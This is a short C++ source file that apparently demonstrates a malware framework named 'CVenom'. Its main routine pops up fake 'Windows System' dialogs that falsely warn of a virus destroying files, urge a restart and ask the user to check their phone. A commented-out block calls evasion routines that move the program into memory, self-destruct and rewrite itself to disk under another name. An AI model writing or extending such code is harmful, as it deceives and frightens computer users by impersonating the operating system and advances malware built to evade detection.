#include "../CVenom.h"
#include "../RuntimeTools.h"
#include "../EvasionTools.h"
#include "../DiskTools.h"
#include "../UITools.h"

using std::cout;


EvasionTools 	Evador;
DataTools	Disk;
RuntimeTools	Runner;
UITools		Interactor;

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	Interactor.MessageUser("Hello I Am A Malware", "But Really You're Infected With Cran ?!");
	Interactor.InformateUser("Windows System", "We Are Trying To Remove The Virus, but you should restart");
	Interactor.AskUser("Windows System", "Can You Check Your Phone?");
	Interactor.WarnUser("Windows System", "We Detected A Virus, Please Restart The Computer!");
	Interactor.ErrorUser("Windows System", "Virus Is Eating Your files!");


/*
	if(Evador.MoveIntoMemory())
		printf("MIM Error\n");

	Evador.SelfDestruct();

	Runner.Wait(10);

	if(Evador.MoveBackToDisk("m2ayar.exe"))
		printf("MBTD Error\n");
*/
	cvexit(MALWARE_EXIT);
}
